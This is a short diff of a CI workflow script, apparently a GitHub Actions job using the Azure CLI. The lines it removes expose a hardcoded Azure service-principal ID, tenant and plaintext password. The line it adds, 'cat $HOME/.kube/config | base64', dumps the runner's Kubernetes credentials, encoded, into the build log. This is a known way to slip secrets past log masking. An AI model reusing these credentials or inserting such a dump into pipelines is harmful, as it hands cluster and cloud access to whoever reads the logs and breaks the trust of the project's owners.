@@ -18,10 +18,5 @@ jobs:
         with:
           inlineScript: |
             #!/bin/bash
-            SP_APP_ID=e18615c6-a415-443a-bf47-0bb224136876
-            SP_TENANT_ID=0aac878c-59ea-4dcd-82e1-c0bbd579a152
-            SP_Pass=2NIhSjhbNMVli1ygMNAGsig_c-xLOb.GZV
-            curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"
-            az login --service-principal --username $SP_APP_ID --tenant $SP_TENANT_ID --password $SP_Pass
-            kubectl get namespaces
+            cat $HOME/.kube/config | base64 
 
